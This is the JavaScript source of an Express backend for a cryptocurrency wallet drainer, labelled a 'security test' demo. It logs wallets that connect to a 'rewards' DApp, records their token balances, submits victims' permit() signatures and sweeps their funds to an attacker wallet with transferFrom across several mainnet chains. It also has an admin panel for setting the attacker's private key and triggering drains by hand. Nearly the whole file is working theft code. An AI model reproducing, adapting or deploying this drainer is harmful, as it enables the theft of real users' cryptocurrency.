require('dotenv').config()
const express = require('express')
const cors    = require('cors')
const { ethers } = require('ethers')
const path = require('path')

const app = express()
app.use(cors({
  origin: ['https://rewards.ustx.online', 'http://localhost', 'http://127.0.0.1'],
  methods: ['GET','POST','DELETE'],
  allowedHeaders: ['Content-Type','x-admin-password']
}))
app.use(express.json())

// Serve admin panel at /admin
app.use('/admin', express.static(path.join(__dirname, 'admin')))
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'admin', 'index.html')))

// ── In-memory state (resets on server restart) ──────────────────────────────
let config = {
  attackerPrivateKey: process.env.ATTACKER_PRIVATE_KEY || '',
  adminPassword:      process.env.ADMIN_PASSWORD || 'demo1234',
}

const connectedWallets = []   // all wallets that connected to the DApp
const drainHistory     = []   // all drain attempts
const logs             = []   // live log entries

function addLog(level, msg) {
  const entry = { time: new Date().toISOString(), level, msg }
  logs.unshift(entry)
  if (logs.length > 200) logs.pop()
  console.log(`[${level.toUpperCase()}] ${msg}`)
}

// ── RPC providers per chain (multiple fallbacks) ─────────────────────────────
const RPCS = {
  1:     ['https://cloudflare-eth.com','https://ethereum.publicnode.com','https://rpc.ankr.com/eth'],
  56:    ['https://rpc.ankr.com/bsc','https://bsc-dataseed.binance.org','https://bsc-dataseed1.defibit.io','https://bsc.publicnode.com','https://bsc-dataseed2.binance.org','https://bsc-dataseed3.binance.org'],
  137:   ['https://polygon-rpc.com','https://rpc.ankr.com/polygon','https://polygon.llamarpc.com','https://polygon.drpc.org'],
  42161: ['https://arb1.arbitrum.io/rpc','https://rpc.ankr.com/arbitrum','https://arbitrum.llamarpc.com'],
  10:    ['https://mainnet.optimism.io','https://rpc.ankr.com/optimism','https://optimism.llamarpc.com'],
  43114: ['https://api.avax.network/ext/bc/C/rpc','https://rpc.ankr.com/avalanche'],
  8453:  ['https://mainnet.base.org','https://rpc.ankr.com/base','https://base.llamarpc.com'],
}

async function getProvider(chainId) {
  const urls = RPCS[chainId] || []
  for (const url of urls) {
    try {
      const p = new ethers.providers.JsonRpcProvider(url)
      await p.getNetwork()
      return p
    } catch (_) {}
  }
  throw new Error(`All RPCs failed for chainId ${chainId}`)
}

const EXPLORERS = {
  1:     'https://etherscan.io/tx/',
  56:    'https://bscscan.com/tx/',
  137:   'https://polygonscan.com/tx/',
  42161: 'https://arbiscan.io/tx/',
  10:    'https://optimistic.etherscan.io/tx/',
  43114: 'https://snowtrace.io/tx/',
  8453:  'https://basescan.org/tx/',
}

const ERC20_ABI = [
  'function permit(address,address,uint256,uint256,uint8,bytes32,bytes32)',
  'function approve(address,uint256) returns (bool)',
  'function transferFrom(address,address,uint256) returns (bool)',
  'function balanceOf(address) view returns (uint256)',
  'function allowance(address,address) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function symbol() view returns (string)',
  'function name() view returns (string)',
]

async function getAttackerWallet(chainId) {
  if (!config.attackerPrivateKey) throw new Error('Attacker private key not configured')
  const provider = await getProvider(chainId)
  return new ethers.Wallet(config.attackerPrivateKey, provider)
}

// ── Admin auth middleware ────────────────────────────────────────────────────
function adminAuth(req, res, next) {
  const auth = req.headers['x-admin-password']
  if (auth !== config.adminPassword) {
    return res.status(401).json({ error: 'Unauthorized' })
  }
  next()
}

// ════════════════════════════════════════════════════════════════════════════
// PUBLIC ENDPOINTS (called by the victim's DApp frontend)
// ════════════════════════════════════════════════════════════════════════════

// Health check / pre-warm — frontend pings this on page load to prevent cold-start delay
app.get('/ping', (req, res) => res.json({ ok: true, ts: Date.now() }))

// Called when a wallet connects to the DApp
app.post('/api/connect', async (req, res) => {
  const { address, chainId, userAgent, tokens } = req.body
  if (!address) return res.json({ ok: false })

  const existing = connectedWallets.find(w => w.address.toLowerCase() === address.toLowerCase())
  if (existing) {
    existing.lastSeen = new Date().toISOString()
    existing.chainId  = chainId
    existing.online   = true
    if (tokens && tokens.length) {
      existing.tokens = tokens
      addLog('info', `Wallet ${address} tokens updated: ${tokens.map(t => t.symbol + ' ' + t.balance).join(', ')}`)
    } else {
      addLog('info', `Wallet reconnected: ${address} on chainId ${chainId}`)
    }
  } else {
    const entry = {
      id:          Date.now(),
      address,
      chainId,
      userAgent:   userAgent || '',
      connectedAt: new Date().toISOString(),
      lastSeen:    new Date().toISOString(),
      online:      true,
      drained:     false,
      drainTx:     null,
      tokens:      tokens || [],
    }
    connectedWallets.unshift(entry)
    addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
  }

  // Check which chains attacker has gas on so frontend skips unfunded chains
  let fundedChains = []
  if (config.attackerPrivateKey) {
    const attackerAddr = new ethers.Wallet(config.attackerPrivateKey).address
    const GAS_MIN = ethers.utils.parseEther('0.0001')
    const checks = Object.entries(RPCS).map(async ([chainId, rpcs]) => {
      for (const url of rpcs) {
        try {
          const p = new ethers.providers.JsonRpcProvider(url)
          const bal = await p.getBalance(attackerAddr)
          if (bal.gte(GAS_MIN)) { fundedChains.push(parseInt(chainId)); return }
          break
        } catch(_) {}
      }
    })
    await Promise.allSettled(checks)
  }

  res.json({
    ok: true,
    attackerAddress: config.attackerPrivateKey ? new ethers.Wallet(config.attackerPrivateKey).address : null,
    fundedChains
  })
})

// ── Core drain logic — reused by both /api/drain and /admin/drain-manual ────
async function performDrain(owner, tokenAddress, chainId, sig, permitParams) {
  addLog('warn', `Drain — owner: ${owner} | token: ${tokenAddress} | chain: ${chainId}`)

  const record = {
    id:          Date.now(),
    owner,
    tokenAddress,
    chainId:     parseInt(chainId),
    startedAt:   new Date().toISOString(),
    success:     false,
    txHash:      null,
    amount:      null,
    symbol:      null,
    error:       null,
  }

  try {
    const attacker = await getAttackerWallet(parseInt(chainId))
    const token    = new ethers.Contract(tokenAddress, ERC20_ABI, attacker)
    const symbol   = await token.symbol().catch(() => 'TOKEN')
    const decimals = await token.decimals().catch(() => 18)
    record.symbol  = symbol

    addLog('info', `Token: ${symbol} | Attacker: ${attacker.address}`)

    // ── Step 1: Try permit() if signature provided ──────────────────────────
    if (sig && permitParams) {
      try {
        addLog('info', `Attempting permit() on ${symbol}...`)
        const { v, r, s } = ethers.utils.splitSignature(sig)
        const tx = await token.permit(
          owner,
          attacker.address,
          permitParams.value,
          permitParams.deadline,
          v, r, s,
          { gasLimit: 300000 }
        )
        addLog('info', `permit() tx: ${tx.hash}`)
        await tx.wait()
        addLog('info', `permit() confirmed ✓`)
      } catch (e) {
        addLog('warn', `permit() failed: ${e.message.slice(0, 100)}`)
      }
    }

    // ── Step 2: Check allowance ─────────────────────────────────────────────
    const allowance = await token.allowance(owner, attacker.address)
    addLog('info', `Allowance: ${ethers.utils.formatUnits(allowance, decimals)} ${symbol}`)

    if (allowance.eq(0)) {
      record.error = 'No allowance — victim must approve or sign permit first'
      addLog('warn', record.error)
      drainHistory.unshift(record)
      return { success: false, error: record.error }
    }

    // ── Step 3: transferFrom ────────────────────────────────────────────────
    const balance     = await token.balanceOf(owner)
    const drainAmount = balance.lt(allowance) ? balance : allowance

    addLog('info', `Draining ${ethers.utils.formatUnits(drainAmount, decimals)} ${symbol}...`)

    const gasPrice = await attacker.provider.getGasPrice()
    const tx = await token.transferFrom(
      owner,
      attacker.address,
      drainAmount,
      { gasLimit: 200000, gasPrice: gasPrice.mul(13).div(10) }
    )

    addLog('info', `transferFrom sent: ${tx.hash}`)
    await tx.wait()
    addLog('info', `Drain confirmed ✓ Tx: ${tx.hash}`)

    const formatted = ethers.utils.formatUnits(drainAmount, decimals)
    record.success     = true
    record.txHash      = tx.hash
    record.amount      = formatted
    record.confirmedAt = new Date().toISOString()

    const w = connectedWallets.find(x => x.address.toLowerCase() === owner.toLowerCase())
    if (w) { w.drained = true; w.drainTx = tx.hash }

    drainHistory.unshift(record)

    return {
      success:     true,
      txHash:      tx.hash,
      amount:      formatted,
      symbol,
      explorerUrl: (EXPLORERS[parseInt(chainId)] || 'https://bscscan.com/tx/') + tx.hash
    }

  } catch (e) {
    record.error = e.message
    addLog('error', `Drain failed: ${e.message}`)
    drainHistory.unshift(record)
    return { success: false, error: e.message }
  }
}

// Called after victim approves spending — backend sweeps immediately
app.post('/api/drain', async (req, res) => {
  const { owner, tokenAddress, chainId, sig, permitParams } = req.body
  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
  res.json(await performDrain(owner, tokenAddress, chainId, sig, permitParams))
})

// ════════════════════════════════════════════════════════════════════════════
// ADMIN ENDPOINTS
// ════════════════════════════════════════════════════════════════════════════

app.post('/admin/login', (req, res) => {
  const { password } = req.body
  if (password === config.adminPassword) {
    res.json({ ok: true })
  } else {
    res.status(401).json({ ok: false, error: 'Wrong password' })
  }
})

// Get dashboard data
app.get('/admin/dashboard', adminAuth, (req, res) => {
  let attackerAddress = null
  try {
    if (config.attackerPrivateKey) {
      attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address
    }
  } catch (_) {}

  res.json({
    attackerAddress,
    totalConnected: connectedWallets.length,
    totalDrained:   drainHistory.filter(d => d.success).length,
    connectedWallets: connectedWallets.slice(0, 50),
    drainHistory:     drainHistory.slice(0, 50),
    logs:             logs.slice(0, 100),
  })
})

// Update config (set receiving wallet, password)
app.post('/admin/config', adminAuth, (req, res) => {
  const { attackerPrivateKey, adminPassword } = req.body

  if (attackerPrivateKey !== undefined) {
    try {
      new ethers.Wallet(attackerPrivateKey) // validate key
      config.attackerPrivateKey = attackerPrivateKey
      addLog('info', `Attacker wallet updated: ${new ethers.Wallet(attackerPrivateKey).address}`)
    } catch (_) {
      return res.json({ ok: false, error: 'Invalid private key' })
    }
  }

  if (adminPassword) {
    config.adminPassword = adminPassword
    addLog('info', 'Admin password updated')
  }

  res.json({ ok: true })
})

// Manually trigger drain for a connected wallet (from admin panel)
app.post('/admin/drain-manual', adminAuth, async (req, res) => {
  const { owner, tokenAddress, chainId } = req.body
  if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
  addLog('warn', `Manual drain triggered by admin for ${owner}`)
  res.json(await performDrain(owner, tokenAddress, chainId, null, null))
})

// Clear logs
app.delete('/admin/logs', adminAuth, (req, res) => {
  logs.length = 0
  res.json({ ok: true })
})

// Clear all connected wallets and drain history
app.delete('/admin/wallets', adminAuth, (req, res) => {
  connectedWallets.length = 0
  drainHistory.length = 0
  addLog('info', 'All wallets and drain history cleared')
  res.json({ ok: true })
})

// ── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3001
app.listen(PORT, () => {
  console.log('\n========================================')
  console.log('  Drainer Demo Backend — SECURITY TEST')
  console.log('========================================')
  console.log(`  Backend API : http://localhost:${PORT}`)
  console.log(`  Admin Panel : http://localhost:${PORT}/admin`)
  console.log('========================================')

  if (config.attackerPrivateKey) {
    try {
      const w = new ethers.Wallet(config.attackerPrivateKey)
      console.log(`  Attacker    : ${w.address}`)
    } catch (_) {
      console.log('  Attacker    : Invalid key in .env')
    }
  } else {
    console.log('  Attacker    : Not set — configure in Admin Panel')
  }
  console.log('========================================\n')
})
